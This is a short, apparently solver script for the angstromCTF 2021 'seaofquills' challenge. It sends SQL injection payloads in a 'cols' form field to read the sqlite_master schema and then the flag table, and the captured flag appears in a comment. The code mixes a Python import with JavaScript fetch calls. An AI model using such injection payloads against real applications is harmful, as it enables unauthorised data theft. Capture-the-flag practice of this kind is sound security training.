import requests

const url = "https://seaofquills.2021.chall.actf.co"

fetch(url, {
    method: 'POST',
    body: new URLSearchParams({
        'limit':1,
        'ofset':0,
        'cols':'sql from sqlite_master union select url'
    })
}).then((x) => x.text()).then((x) => console.log(x));
// Output : (Skip) flagtable (Skip)

fetch(url, {
    method: 'POST',
    body: new URLSearchParams({
        'limit':1,
        'ofset':0,
        'cols':'flag from flagtable union select url'
    })
}).then((x) => x.text()).then((x) => console.log(x));
// Output : actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}
